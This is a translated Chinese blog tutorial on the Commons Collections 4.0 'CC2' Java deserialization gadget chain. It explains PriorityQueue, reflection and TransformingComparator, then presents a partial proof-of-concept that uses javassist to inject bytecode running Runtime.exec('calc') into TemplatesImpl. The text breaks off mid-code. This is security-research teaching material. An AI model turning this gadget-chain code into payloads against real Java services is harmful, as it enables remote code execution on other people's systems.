# Java安全之Commons Collections2分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
前面分析了CC1的利用链，但是发现在CC1的利用链中是有版本的限制的。在JDK1.8
8u71版本以后，对`AnnotationInvocationHandler`的`readobject`进行了改写。导致高版本中利用链无法使用。
这就有了其他的利用链，在CC2链里面并不是使用 `AnnotationInvocationHandler`来构造，而是使用
​ `javassist`和`PriorityQueue`来构造利用链。
CC2链中使用的是`commons-collections-4.0`版本，但是CC1在`commons-collections-4.0`版本中其实能使用，但是`commons-collections-4.0`版本删除了`lazyMap`的`decode`方法，这时候我们可以使用`lazyMap`方法来代替。但是这里产生了一个疑问，为什么CC2链中使用`commons-collections-4.0`3.2.1-3.1版本不能去使用，使用的是`commons-collections-4.0`4.0的版本？在中间查阅了一些资料，发现在3.1-3.2.1版本中`TransformingComparator`并没有去实现`Serializable`接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。
下面我把利用链给贴上。
    Gadget chain:
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
下面就来学习一下需要用到的基础知识。
关于`javassist`上篇文章已经讲过了，可以参考该篇文章：[Java安全之Javassist动态编程](https://www.cnblogs.com/nice0e3/p/13811335.html)
## 0x01 前置知识
###  PriorityQueue
####  构造方法:
    PriorityQueue()           
        使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
    PriorityQueue(int initialCapacity)
        使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
####  常见方法：
    add(E e)                       将指定的元素插入此优先级队列
    clear()                        从此优先级队列中移除所有元素。
    comparator()                   返回用来对此队列中的元素进行排序的比较器；如果此队列根据其元素的自然顺序进行排序，则返回 null
    contains(Object o)          如果此队列包含指定的元素，则返回 true。
    iterator()                   返回在此队列中的元素上进行迭代的迭代器。
    offer(E e)                   将指定的元素插入此优先级队列
    peek()                       获取但不移除此队列的头；如果此队列为空，则返回 null。
    poll()                       获取并移除此队列的头，如果此队列为空，则返回 null。
    remove(Object o)               从此队列中移除指定元素的单个实例（如果存在）。
    size()                       返回此 collection 中的元素数。
    toArray()                      返回一个包含此队列所有元素的数组。
####  代码示例：
     public static void main(String[] args) {
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(2);
            priorityQueue.add(1);
            System.out.println(priorityQueue.poll());
            System.out.println(priorityQueue.poll());
        }
结果：
    1
    2
###  getDeclaredField
getDeclaredField是class超类的一个方法。该方法用来获取类中或接口中已经存在的一个字段，也就是成员变量。
该方法返回的是一个Field对象。
###  Field
####  常用方法：
    get            返回该所表示的字段的值 Field ，指定的对象上。 
    set            将指定对象参数上的此 Field对象表示的字段设置为指定的新值。
###  TransformingComparator
`TransformingComparator`是一个修饰器，和CC1中的`ChainedTransformer`类似。
查看一下该类的构造方法
这里发现个有意思的地方，`compare`方法会去调用`transformer`的`transform`方法，嗅到了一丝丝CC1的味道。
## 0x02 POC分析
    package com.test;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class cc2 {
        public static void main(String[] args) throws Exception {
            String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classPool=ClassPool.getDefault();//返回默认的类池
            classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
            CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
            payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
            payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime
            byte[] bytes=payload.toBytecode();//转换为byte数组
            Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
            Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
            field.setAccessible(true);//暴力反射
            field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
            Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
            field1.setAccessible(true);//暴力反射
            field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test
            InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
            TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
            PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。